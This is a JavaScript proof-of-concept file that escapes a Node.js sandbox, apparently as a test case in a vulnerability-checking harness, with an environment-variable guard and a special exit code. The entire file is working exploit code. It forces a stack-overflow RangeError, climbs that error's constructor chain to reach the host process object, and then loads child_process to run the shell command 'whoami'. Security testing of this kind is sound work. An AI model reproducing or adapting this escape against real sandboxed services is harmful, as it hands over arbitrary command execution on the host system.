if (!process.env.DANGEROUS_RUN_VULN) {
	console.log(
		"NOT RUNNING VULNERABLE CODE WITHOUT 'DANGEROUS_RUN_VULN' ENVIRONMENT VARIABLE",
	);
	process.exit(1);
}

process.on("uncaughtException", (error) => {
	console.error(error);
	if (error.message === "i.require is not a function") {
		process.exit(82);
	}

	process.exit(1);
});

const ft = {
	length: 10,
	utf8Write() {},
};
function r(i) {
	var x = 0;
	try {
		x = r(i);
	} catch (e) {}
	if (typeof x !== "number") return x;
	if (x !== i) return x + 1;
	try {
		Buffer.prototype.write.call(ft);
	} catch (e) {
		return e;
	}
	return null;
}
RangeError.prototype.c = (c) => c.constructor("return process")();
var i = 1;
while (1) {
	try {
		x = r(i);
		try {
			i = x.constructor.constructor("return process")().mainModule;
			break;
		} catch (x) {
			i = x.c(Buffer.from);
			break;
		}
	} catch (x) {
		i++;
	}
}
const out = i
	.require("child" + "_process")
	.execSync("whoami")
	.toString();
console.log(out);
